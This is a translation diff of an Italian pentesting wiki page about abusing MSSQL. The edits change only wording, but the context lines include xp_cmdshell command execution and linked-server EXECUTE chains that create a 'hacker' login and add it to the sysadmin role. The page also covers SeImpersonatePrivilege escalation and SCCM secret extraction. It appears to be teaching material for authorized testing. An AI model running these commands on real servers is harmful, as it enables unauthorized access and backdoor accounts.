@@ -166,7 +166,7 @@ Potrebbe essere anche possibile **eseguire comandi** all'interno dell'host MSSQL
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Controlla nella pagina menzionata nella **sezione seguente come farlo manualmente.**
+Controlla nella pagina menzionata nella **seguente sezione come farlo manualmente.**
 
 ### MSSQL Tecniche di Hacking di Base
 
@@ -266,7 +266,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 Se non puoi eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con il metodo `EXECUTE`.
 
-### Manual - EXECUTE
+### Manuale - EXECUTE
 
 Puoi anche abusare dei link fidati usando `EXECUTE`:
 ```bash
@@ -274,7 +274,7 @@ Puoi anche abusare dei link fidati usando `EXECUTE`:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Elevazione dei privilegi locali
+## Local Privilege Escalation
 
 L'**utente locale MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo consente all'account di "impersonare un client dopo l'autenticazione".
 
@@ -284,8 +284,8 @@ Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad aut
 
 
 
-### Relay NTLM del Punto di Gestione SCCM (Estrazione dei Segreti OSD)
-Scopri come i ruoli SQL predefiniti dei **Punti di Gestione** SCCM possono essere abusati per estrarre direttamente l'Account di Accesso alla Rete e i segreti della Sequenza di Attività dal database del sito:
+### SCCM Management Point NTLM Relay (Estrazione dei segreti OSD)
+Scopri come i ruoli SQL predefiniti di SCCM **Management Points** possono essere abusati per estrarre direttamente l'Account di Accesso alla Rete e i segreti della Sequenza di Attività dal database del sito:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
